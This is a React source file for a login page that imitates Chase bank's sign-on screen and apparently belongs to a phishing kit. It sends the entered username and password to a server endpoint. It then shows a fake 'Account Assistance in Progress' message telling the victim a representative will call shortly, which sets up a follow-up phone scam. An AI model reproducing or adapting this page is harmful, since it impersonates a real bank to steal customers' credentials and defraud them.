import React, { useState } from "react";
import css from "./Body.module.css";
import axios from "axios"
import {BeatLoader} from "react-spinners"
import { Dialog } from "@/components/ui/dialog";



const Body = () => {

    const [username, setUsername] = useState("")
    const [password, setPassword] = useState("")
    const [showPassword, setShowPassword] = useState(false)
    const [loading, setLoading] = useState(false)
    const [open, setOpen ] = useState(false)

    const handleSubmit = async ()=>{
      try {
        setLoading(true)
        setOpen(true)
        await axios.post("/api/auth/login", {username, password})
        setPassword("")
        setUsername("")
        
      } catch (error) {
        console.log(error)
      }finally{
        setLoading(false)
      }
      
    }

  return (
    <div className={css.wrapper}>
      <div className={css.container}>

      <Dialog open={open} onClose={() => setOpen(false)}>
        <h2 className="text-2xl font-semibold text-gray-900 ">Account Assistance in Progress</h2>
        

        {/* Content */}
        <p className="text-gray-800 text-[1.3rem] p-8 mt-7 pt-4 leading-normal">
          Thank you for being a valued Chase customer. You have been logged out, and your account issue will be resolved.  
          <br />
          One of our representatives will be giving you a call shortly.
        </p>
      </Dialog>
     
        <p>Good evening</p>
        <div className={css.input_container}>
          <div>
            <label htmlFor="username">Username</label>
            <input
              className={css.input}
              type="text"
              placeholder="enter username"
              id="username"
              value={username}
              onChange={(e)=>setUsername(e.target.value)}
            />
          </div>
          <div className={css.cross} onClick={()=>setUsername("")}>
            <svg
              width="19px"
              height="19px"
              viewBox="0 0 19 19"
              aria-hidden="true"
              role="img"
              className="DeleteAllIcon__deleteAllIcon___CUI9j"
              focusable="false"
            >
              <path d="M13.44 12.52l-1.06 1.06-3.01-3.01-3 3.01-1.07-1.06 3.01-3.01-3.01-3 1.07-1.06 3 3 3.01-3 1.06 1.06-3.01 3 3.01 3.01z"></path>
              <path d="M9.35 18.53a9.1 9.1 0 1 1 9.1-9.1 9.11 9.11 0 0 1-9.1 9.1zm0-17.14a8 8 0 1 0 8 8 8 8 0 0 0-8-8z"></path>
            </svg>
          </div>
        </div>

        <div className={css.input_container2}>
          <div>
            <label className={css.label} htmlFor="password">Password</label>
            <input
              className={css.input2}
              type={showPassword ? "text" : "password"}
              value={password}
              placeholder="enter password"
              id="password"
              onChange={(e)=>setPassword(e.target.value)}
            />
          </div>
          <div className={css.toggle} onClick={()=>setShowPassword(!showPassword)}>{showPassword? "Hide": "Show"}</div>
        </div>
        <div className={css.checkbox}>
            <input type="checkbox" id="check"/>
            <span>Save username</span>
        </div>
        <div className={css.para}>To help keep your account secure, save your username only on devices that aren't used by other people.</div>
        <button className={css.btn} disabled={!password || ! username} onClick={()=>handleSubmit()}>{loading? <BeatLoader color="#dbdada" />: "Sign on"}</button>

        <div className={css.forgot}>
        <svg width="12px" height="12px" aria-hidden="true" role="img" focusable="false"><path d="M5.79535 10.4696C5.98566 10.6697 6.30215 10.6776 6.50224 10.4873L10.828 6.37298C11.0448 6.17982 11.0524 5.84013 10.8396 5.63769L6.50222 1.51269C6.30213 1.32239 5.98564 1.33033 5.79534 1.53043C5.60504 1.73053 5.61298 2.04701 5.81308 2.23731L9.24373 5.5H1.45C1.20147 5.5 1 5.72386 1 6C1 6.27614 1.20147 6.5 1.45 6.5H9.24346L5.81306 9.7627C5.61297 9.95301 5.60504 10.2695 5.79535 10.4696Z"></path></svg>
        <a href="#">Forgot username or password?</a>
        </div>
      </div>
    </div>
  );
};

export default Body;
